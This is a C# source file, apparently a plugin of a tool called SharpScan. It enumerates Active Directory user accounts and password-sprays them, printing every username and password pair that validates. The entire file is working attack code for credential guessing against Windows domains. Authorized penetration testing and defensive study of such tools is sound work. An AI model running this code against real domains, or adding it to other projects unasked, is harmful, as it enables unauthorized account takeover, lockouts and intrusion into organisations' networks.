using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;
using System.Security.Authentication;
using System.Text;

namespace SharpScan.Plugins
{
    internal class KerberEnum
    {

        public static void CheckUserlistExist()
        {
            DirectoryEntry dirEntry = new DirectoryEntry("LDAP://rootDSE");
            string dnsHostname = dirEntry.Properties["dnsHostname"].Value.ToString();
            string defaultNamingContext = dirEntry.Properties["defaultNamingContext"].Value.ToString();
            string Domain = Domain_c.GetDomainNameFromDN(defaultNamingContext);
            foreach (var user in Program.userList)
            {
                if (CheckUserExists(Domain, user))
                {
                    Console.WriteLine($"[+] Curren Domain:{Domain}, User:{user}, Exists:True");
                }
                else
                {
                    Console.WriteLine($"[+] Curren Domain:{Domain}, User:{user}, Exists:False");
                }
            }
        }

        public static void Passwordspray(string password)
        {
            DirectoryEntry dirEntry = new DirectoryEntry("LDAP://rootDSE");
            string dnsHostname = dirEntry.Properties["dnsHostname"].Value.ToString();
            string defaultNamingContext = dirEntry.Properties["defaultNamingContext"].Value.ToString();
            string Domain = Domain_c.GetDomainNameFromDN(defaultNamingContext);
            if (Program.userList != null && Program.passwordList != null)
            {
                foreach (var user in Program.userList)
                {
                    foreach (var pass in Program.passwordList)
                    {
                        if (AttemptLogin(Domain, user, pass))
                        {
                            string output = $"[*] (kerberos) User: {user}  Exist:True,  password: {pass}";
                            if (!Program.Service.Exists(service => service == output))
                            {
                                Program.Service.Add(output);
                                Console.WriteLine(output);
                            }
                        }
                    }
                }
            }
            else
            {
                foreach (var user in Program.userList)
                {
                    if (AttemptLogin(Domain, user, password))
                    {
                        string output = $"[*] (kerberos) User: {user}  Exist:True,  password: {password}";
                        if (!Program.Service.Exists(service => service == output))
                        {
                            Program.Service.Add(output);
                            Console.WriteLine(output);
                        }
                    }
                }
            }
            
        }


        public static void Run(string Domain)
        {
            if (!string.IsNullOrEmpty(Program.userName) && !string.IsNullOrEmpty(Program.passWord))
            {
                if (CheckUserExists(Domain, Program.userName))
                {
                    foreach (var password in Configuration.Passwords)
                    {
                        if (AttemptLogin(Domain, Program.userName, password))
                        {
                            string output = $"[*] (kerberos) User: {Program.userName}  Exist:True,  password: {password}";
                            if (!Program.Service.Exists(service => service == output))
                            {
                                Program.Service.Add(output);
                                Console.WriteLine(output);
                            }
                        }
                    }
                }
            }

            else if (Program.userList != null && Program.passwordList != null)
            {
                foreach (var user in Program.userList)
                {
                    foreach (var password in Program.passwordList)
                    {

                        if (AttemptLogin(Domain, user, password))
                        {
                            string output = $"[*] (kerberos) User: {user}  Exist:True,  password: {password}";
                            if (!Program.Service.Exists(service => service == output))
                            {
                                Program.Service.Add(output);
                                Console.WriteLine(output);
                            }
                        }
                    }
                }
            }

            else if (Configuration.UserDictionary.TryGetValue("kerberos", out List<string> kerberosUsers))
            {
                foreach (var userName in kerberosUsers)
                {
                    if (CheckUserExists(Domain, userName))
                    {
                        foreach (var password in Configuration.Passwords)
                        {
                            if (AttemptLogin(Domain, userName, password))
                            {
                                string output = $"[*] (kerberos) User: {userName}  Exist:True,  password: {password}";
                                if (!Program.Service.Exists(service => service == output))
                                {
                                    Program.Service.Add(output);
                                    Console.WriteLine(output);
                                }
                            }
                        }
                    }
                }
            }

        }

        public static bool CheckUserExists(string domainName, string userName)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName))
                {
                    using (UserPrincipal user = new UserPrincipal(context))
                    {
                        user.SamAccountName = userName;
                        using (PrincipalSearcher searcher = new PrincipalSearcher(user))
                        {
                            return searcher.FindOne() != null;
                        }
                    }
                }
            }
            catch (AuthenticationException ex)
            {
                if (ex.Message.Contains("The specified user does not exist") || ex.Message.Contains("unknown user name or bad password"))
                {
                    return false;
                }
                else
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
        }

        static bool AttemptLogin(string domainName, string userName, string password)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Domain, domainName))
                {
                    return context.ValidateCredentials(userName, password);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"An error occurred during login attempt: {ex.Message}");
                return false;
            }
        }
    }
}
